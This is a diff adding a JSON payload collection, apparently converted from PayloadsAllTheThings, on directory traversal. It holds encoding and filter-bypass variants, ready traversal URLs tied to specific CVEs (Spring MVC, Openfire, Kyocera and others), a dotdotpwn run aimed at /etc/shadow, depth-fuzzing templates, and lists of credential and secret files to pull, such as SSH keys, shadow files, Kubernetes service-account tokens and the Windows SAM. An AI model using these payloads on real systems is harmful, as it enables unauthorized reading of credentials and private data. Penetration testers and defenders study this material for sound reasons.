@@ -1,0 +1,344 @@
+{
+  "category": "Directory Traversal",
+  "source": "PayloadsAllTheThings/Directory Traversal/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "What it is and where to look",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "Path / Directory Traversal is a vulnerability where an application substitutes controllable input into a file path. Using ../ (dot-dot-slash) sequences you can break out of the working directory and read arbitrary files on the filesystem.\n\nWhere to look:\n- Parameters holding a file name: ?file=, ?page=, ?path=, ?template=, ?lang=, ?download=, ?img=.\n- File upload/download, previews, exports, report generation.\n- Headers and cookies that get mapped to a path.\n\nDifference from File Inclusion: here the goal is to READ a file by path (../../etc/passwd). LFI/RFI additionally EXECUTES the content (php://, data://, include())."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Basic constructs and filter bypasses",
+      "language": "text",
+      "tags": ["methodology", "bypass"],
+      "body": "With .. we move up into the parent directory. Below are encoding variants for bypassing weak filters:\n\n../\n..\\\n..\\/\n%2e%2e%2f\n%252e%252e%252f\n%c0%ae%c0%ae%c0%af\n%uff0e%uff0e%u2215\n%uff0e%uff0e%u2216"
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Tools",
+      "language": "text",
+      "tags": ["tools"],
+      "body": "dotdotpwn (wireghoul/dotdotpwn) - a directory traversal fuzzer.\nIIS Short Name Scanner (irsdl/iis_shortname_scanner), shortscan (bitquark) - brute force short 8.3 names in IIS.\nwindowsblindread (soffensive) - a list of interesting paths on Windows."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "dotdotpwn - launch example (FTP)",
+      "language": "bash",
+      "tags": ["tools", "fuzzing"],
+      "body": "perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b"
+    },
+
+    {
+      "subcategory": "Basic ../",
+      "title": "Unix - the classic ../../../etc/passwd",
+      "language": "text",
+      "tags": ["unix", "basic"],
+      "body": "../etc/passwd\n../../etc/passwd\n../../../etc/passwd\n../../../../etc/passwd\n../../../../../etc/passwd\n../../../../../../etc/passwd\n../../../../../../../etc/passwd\n../../../../../../../../etc/passwd"
+    },
+    {
+      "subcategory": "Basic ../",
+      "title": "Windows - backslash ..\\",
+      "language": "text",
+      "tags": ["windows", "basic"],
+      "body": "..\\WINDOWS\\win.ini\n..\\..\\WINDOWS\\win.ini\n..\\..\\..\\WINDOWS\\win.ini\n..\\..\\..\\..\\WINDOWS\\win.ini\n..\\..\\..\\..\\..\\WINDOWS\\win.ini\n..\\..\\..\\..\\..\\..\\WINDOWS\\win.ini"
+    },
+    {
+      "subcategory": "Basic ../",
+      "title": "Windows - bypass via ../ to win.ini / drivers/etc/hosts",
+      "language": "text",
+      "tags": ["windows", "basic"],
+      "body": "../windows/system32/drivers/etc/hosts\n../../windows/system32/drivers/etc/hosts\n../../../windows/system32/drivers/etc/hosts\n../../../../windows/system32/drivers/etc/hosts\n../boot.ini\n../../boot.ini"
+    },
+
+    {
+      "subcategory": "Encoding - URL",
+      "title": "URL encoding table",
+      "language": "table",
+      "tags": ["encoding", "url"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Character", "URL code"],
+          "rows": [
+            [".", "%2e"],
+            ["/", "%2f"],
+            ["\\", "%5c"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Encoding - URL",
+      "title": "URL-encode - example (IPConfigure Orchid Core VMS 2.0.5)",
+      "language": "text",
+      "tags": ["encoding", "url"],
+      "body": "{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd"
+    },
+    {
+      "subcategory": "Encoding - double URL",
+      "title": "Double URL encoding table",
+      "language": "table",
+      "tags": ["encoding", "double-encode"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Character", "Double URL code"],
+          "rows": [
+            [".", "%252e"],
+            ["/", "%252f"],
+            ["\\", "%255c"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Encoding - double URL",
+      "title": "Double-encode - example (Spring MVC, CVE-2018-1271)",
+      "language": "text",
+      "tags": ["encoding", "double-encode", "cve"],
+      "body": "{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini\n{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini"
+    },
+    {
+      "subcategory": "Encoding - Unicode",
+      "title": "16-bit Unicode table (%u...)",
+      "language": "table",
+      "tags": ["encoding", "unicode"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Character", "Unicode code"],
+          "rows": [
+            [".", "%u002e"],
+            ["/", "%u2215"],
+            ["\\", "%u2216"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Encoding - Unicode",
+      "title": "Unicode - example (Openfire Admin Console, CVE-2023-32315)",
+      "language": "text",
+      "tags": ["encoding", "unicode", "cve"],
+      "body": "{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp"
+    },
+    {
+      "subcategory": "Encoding - UTF-8 overlong",
+      "title": "Overlong UTF-8 table",
+      "language": "table",
+      "tags": ["encoding", "utf8", "overlong"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Character", "Overlong encoding variants"],
+          "rows": [
+            [".", "%c0%2e, %e0%40%ae, %c0%ae"],
+            ["/", "%c0%af, %e0%80%af, %c0%2f"],
+            ["\\", "%c0%5c, %c0%80%5c"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Encoding - UTF-8 overlong",
+      "title": "What overlong UTF-8 is",
+      "language": "text",
+      "tags": ["encoding", "utf8", "overlong"],
+      "body": "By the standard, each codepoint is encoded with the minimum necessary number of bytes. An encoding with extra bytes (overlong) is formally invalid, but some parsers accept it and normalize it into a regular character - and that is what bypasses a filter on ../"
+    },
+
+    {
+      "subcategory": "Filter bypass - non-recursive stripping",
+      "title": "Mangled path - duplication when ../ is removed",
+      "language": "text",
+      "tags": ["bypass", "filter", "nested"],
+      "body": "If a WAF/filter strips ../ ONCE (non-recursively) - nest the sequences so that after stripping you get ../ again.\n\n..././\n...\\.\\\n....//\n..../\\"
+    },
+    {
+      "subcategory": "Filter bypass - non-recursive stripping",
+      "title": "Mangled path - example (Mirasys DVMS <=5.12.6)",
+      "language": "text",
+      "tags": ["bypass", "filter"],
+      "body": "{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini"
+    },
+    {
+      "subcategory": "Filter bypass - null byte",
+      "title": "NULL-byte (%00) - truncating the extension",
+      "language": "text",
+      "tags": ["bypass", "null-byte"],
+      "body": "The null byte (%00, 0x00) is a string terminator in C/C++. If the application appends an extension (for example .htm), %00 truncates the string before it and lets you read an arbitrary file."
+    },
+    {
+      "subcategory": "Filter bypass - null byte",
+      "title": "NULL-byte - example (Homematic CCU3, CVE-2019-9726)",
+      "language": "text",
+      "tags": ["bypass", "null-byte", "cve"],
+      "body": "{{BaseURL}}/.%00./.%00./etc/passwd"
+    },
+    {
+      "subcategory": "Filter bypass - null byte",
+      "title": "NULL-byte - example with a suffix (Kyocera d-COPIA253MF, CVE-2020-23575)",
+      "language": "text",
+      "tags": ["bypass", "null-byte", "cve"],
+      "body": "{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm"
+    },
+    {
+      "subcategory": "Filter bypass - reverse proxy",
+      "title": "..;/ - discrepancy between Nginx and Tomcat",
+      "language": "text",
+      "tags": ["bypass", "reverse-proxy", "tomcat"],
+      "body": "Nginx treats /..;/ as a regular directory, while Tomcat interprets it as /../ - this lets you reach hidden servlets behind the proxy.\n\n..;/"
+    },
+    {
+      "subcategory": "Filter bypass - reverse proxy",
+      "title": "..;/ - example (Pascom Cloud Phone System, CVE-2021-45967)",
+      "language": "text",
+      "tags": ["bypass", "reverse-proxy", "cve"],
+      "body": "{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}"
+    },
+    {
+      "subcategory": "Filter bypass - UNC / absolute path",
+      "title": "UNC Share (Windows) - \\\\host\\share",
+      "language": "text",
+      "tags": ["bypass", "windows", "unc", "ntlm"],
+      "body": "Injecting a Windows UNC path (\\\\UNC\\share\\name) redirects access to an arbitrary file or network resource. Additionally, the machine may authenticate to the remote share, sending an NTLM exchange (which can be captured/relayed).\n\n\\\\localhost\\c$\\windows\\win.ini"
+    },
+    {
+      "subcategory": "Filter bypass - Java URL protocol",
+      "title": "Java new URL('') - the url: prefix",
+      "language": "text",
+      "tags": ["bypass", "java", "ssrf"],
+      "body": "In Java, new URL('') supports the format url:URL - you can slip in file:// or http:// to an internal resource.\n\nurl:file:///etc/passwd\nurl:http://127.0.0.1:8080"
+    },
+    {
+      "subcategory": "Filter bypass - ASP.NET Cookieless",
+      "title": "ASP.NET cookieless - inserting (S(...)) into the URL",
+      "language": "text",
+      "tags": ["bypass", "aspnet", "cookieless"],
+      "body": "With cookieless session state enabled, ASP.NET embeds the Session ID right into the URL: http://site/(S(lit3py55t21z5v55vlm25s55))/page.aspx. This insertion can be used to bypass URL filtering.\n\nApplication at the root:\n/(S(X))/\n/(Y(Z))/\n/(G(AAA-BBB)D(CCC=DDD)E(0-1))/\n/(S(X))/admin/(S(X))/main.aspx\n/(S(x))/b/(S(x))in/Navigator.dll\n\nApplication in a subfolder:\n/MyApp/(S(X))/\n/admin/(S(X))/main.aspx\n/admin/Foobar/(S(X))/../(S(X))/main.aspx"
+    },
+    {
+      "subcategory": "Filter bypass - ASP.NET Cookieless",
+      "title": ".NET version -> insertion URI format",
+      "language": "table",
+      "tags": ["aspnet", "cookieless"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": [".NET version", "URI"],
+          "rows": [
+            ["V1.0, V1.1", "/(XXXXXXXX)/"],
+            ["V2.0+", "/(S(XXXXXXXX))/"],
+            ["V2.0+", "/(A(XXXXXXXX)F(YYYYYYYY))/"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Filter bypass - ASP.NET Cookieless",
+      "title": "CVE -> payload (cookieless)",
+      "language": "table",
+      "tags": ["aspnet", "cookieless", "cve"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["CVE", "Payload"],
+          "rows": [
+            ["CVE-2023-36899", "/WebForm/(S(X))/prot/(S(X))ected/target1.aspx"],
+            ["-", "/WebForm/(S(X))/b/(S(X))in/target2.aspx"],
+            ["CVE-2023-36560", "/WebForm/pro/(S(X))tected/target1.aspx/(S(X))/"],
+            ["-", "/WebForm/b/(S(X))in/target2.aspx/(S(X))/"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Filter bypass - IIS Short Name",
+      "title": "IIS Short Name - brute force 8.3 names",
+      "language": "bash",
+      "tags": ["bypass", "iis", "windows"],
+      "body": "java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'\njava -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'\nshortscan http://example.org/"
+    },
+
+    {
+      "subcategory": "Deep traversal",
+      "title": "Ready-made wordlists for depth fuzzing",
+      "language": "text",
+      "tags": ["fuzzing", "wordlist", "deep"],
+      "body": "Traversal depth is brute-forced with a fuzzer against a wordlist (1-8+ levels of ../) with different encodings at the same time. PayloadsAllTheThings ships ready-made lists (Intruder/):\n\n- directory_traversal.txt - Windows win.ini / etc/passwd / .htaccess in plain, %5c/%2e-encoded and double-percent (%%35%63...) forms.\n- deep_traversal.txt - templates for 1-8 levels with the {FILE} placeholder: ../, ..;/, ..%2f, %2e%2e/ ...\n- traversals-8-deep-exotic-encoding.txt - the same, with a leading /../, plus double-encode %252f.\n- dotdotpwn.txt - combinations of ../ + typical files (etc/passwd, etc/issue, boot.ini, drivers/etc/hosts).\n\nSubstitute {FILE} = etc/passwd or windows/win.ini and run it through Intruder/ffuf."
+    },
+    {
+      "subcategory": "Deep traversal",
+      "title": "Templates with the {FILE} placeholder (1-8 levels)",
+      "language": "text",
+      "tags": ["fuzzing", "deep", "encoding"],
+      "body": "../{FILE}\n../../{FILE}\n../../../../../../../../{FILE}\n..;/{FILE}\n..;/..;/..;/{FILE}\n..%2f{FILE}\n..%2f..%2f..%2f{FILE}\n%2e%2e/{FILE}\n%2e%2e/%2e%2e/%2e%2e/{FILE}\n/../{FILE}\n/..%2f..%2f{FILE}\n/%2e%2e%2f%2e%2e%2f{FILE}\n/..%252f..%252f{FILE}"
+    },
+
+    {
+      "subcategory": "Interesting files - Linux",
+      "title": "OS and system information",
+      "language": "text",
+      "tags": ["linux", "files", "loot"],
+      "body": "/etc/issue\n/etc/group\n/etc/hosts\n/etc/motd\n/etc/passwd\n/etc/shadow"
+    },
+    {
+      "subcategory": "Interesting files - Linux",
+      "title": "/proc - processes, environment, version",
+      "language": "text",
+      "tags": ["linux", "proc", "loot"],
+      "body": "/proc/[0-9]*/fd/[0-9]*   # first number is the PID, second is the file descriptor\n/proc/self/environ\n/proc/version\n/proc/cmdline\n/proc/sched_debug\n/proc/mounts"
+    },
+    {
+      "subcategory": "Interesting files - Linux",
+      "title": "/proc - network and current path",
+      "language": "text",
+      "tags": ["linux", "proc", "network"],
+      "body": "/proc/net/arp\n/proc/net/route\n/proc/net/tcp\n/proc/net/udp\n/proc/self/cwd/index.php\n/proc/self/cwd/main.py"
+    },
+    {
+      "subcategory": "Interesting files - Linux",
+      "title": "locate indexes (fast filesystem listing)",
+      "language": "text",
+      "tags": ["linux", "loot", "locate"],
+      "body": "/var/lib/mlocate/mlocate.db\n/var/lib/plocate/plocate.db\n/var/lib/mlocate.db"
+    },
+    {
+      "subcategory": "Interesting files - Linux",
+      "title": "Credentials and history",
+      "language": "text",
+      "tags": ["linux", "creds", "loot"],
+      "body": "/etc/passwd\n/etc/shadow\n/home/$USER/.bash_history\n/home/$USER/.ssh/id_rsa\n/etc/mysql/my.cnf"
+    },
+    {
+      "subcategory": "Interesting files - Linux",
+      "title": "Kubernetes service account",
+      "language": "text",
+      "tags": ["linux", "kubernetes", "loot"],
+      "body": "/run/secrets/kubernetes.io/serviceaccount/token\n/run/secrets/kubernetes.io/serviceaccount/namespace\n/run/secrets/kubernetes.io/serviceaccount/certificate\n/var/run/secrets/kubernetes.io/serviceaccount"
+    },
+    {
+      "subcategory": "Interesting files - Windows",
+      "title": "Reliable PoC files (win.ini / license.rtf)",
+      "language": "text",
+      "tags": ["windows", "files", "poc"],
+      "body": "The files license.rtf and win.ini are consistently present on modern Windows - handy as proof-of-concept (the content is not secret, but the fact of reading it confirms the vulnerability).\n\nC:\\Windows\\win.ini\nC:\\windows\\system32\\license.rtf"
+    },
+    {
+      "subcategory": "Interesting files - Windows",
+      "title": "Sensitive paths (windowsblindread)",
+      "language": "text",
+      "tags": ["windows", "files", "loot"],
+      "body": "c:/inetpub/logs/logfiles\nc:/inetpub/wwwroot/global.asa\nc:/inetpub/wwwroot/web.config\nc:/sysprep.inf\nc:/sysprep.xml\nc:/sysprep/sysprep.inf\nc:/sysprep/sysprep.xml\nc:/system32/inetsrv/metabase.xml\nc:/system volume information/wpsettings.dat\nc:/unattend.txt\nc:/unattend.xml\nc:/unattended.txt\nc:/unattended.xml\nc:/windows/repair/sam\nc:/windows/repair/system"
+    }
+  ]
+}
